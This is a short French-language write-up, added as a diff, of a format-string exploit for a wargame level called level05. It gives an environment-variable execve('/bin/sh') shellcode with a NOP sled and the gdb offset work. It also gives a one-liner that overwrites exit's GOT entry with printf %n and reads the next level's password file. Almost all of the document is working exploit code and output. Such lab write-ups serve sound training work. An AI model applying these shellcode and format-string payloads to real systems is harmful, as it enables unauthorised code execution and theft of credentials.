@@ -1,0 +1,31 @@
+Idee generale : remplacer l'adresse d'exit par l'adresse d'un shellcode mis dans l'environnement, en utilisant printf %n
+
+export SHELLCODE=$(python -c 'print "\x90"*100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
+
+
+- adresse de SHELLCODE = 0xffffd84d
+- adresse d'un des NOP = 0xffffd88b
+
+1) on trouve l'adresse GOT d'exit grace a objdump -R
+    0x080497e0
+
+1) on trouve l'offset du printf
+    break avant le printf
+    (gdb) x/24wx $esp
+    0xffffd540:	0xffffd568	0x00000064	0xf7fcfac0	0xf7ec3af9
+    0xffffd550:	0xffffd58f	0xffffd58e	0x00000000	0xffffffff
+    0xffffd560:	0xffffd614	0x00000000	0x61616161	0xf7e5000a
+    => offset = 10
+
+2) on coupe en deux 0xffffd88b
+    d88b = 55435
+    ffff = 65535
+
+    on va ecrire 55435 a l'offset 10
+            et   65535            11
+
+    55435 - 4 - 4 = 55427
+    65535 - 55427 = 10100
+
+
+(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55427x%10$n%10100x%11$n"' ; echo 'cat /home/users/level06/.pass') | ./level05
